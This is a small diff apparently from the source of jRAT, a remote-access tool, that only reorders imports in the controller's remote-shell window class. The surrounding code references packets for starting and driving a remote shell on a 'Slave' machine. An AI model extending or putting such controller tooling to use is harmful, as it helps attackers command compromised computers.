@@ -6,13 +6,13 @@ import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet22RemoteShellTyped;
 import jrat.controller.packets.outgoing.Packet23RemoteShellStart;
 import jrat.controller.packets.outgoing.Packet24RemoteShellStop;
-import java.awt.BorderLayout;
-import java.awt.Toolkit;
+
+import javax.swing.*;
+import java.awt.*;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
 import java.util.Map;
-import javax.swing.JScrollPane;
 
 @SuppressWarnings("serial")
 public class FrameRemoteShell extends BaseFrame {
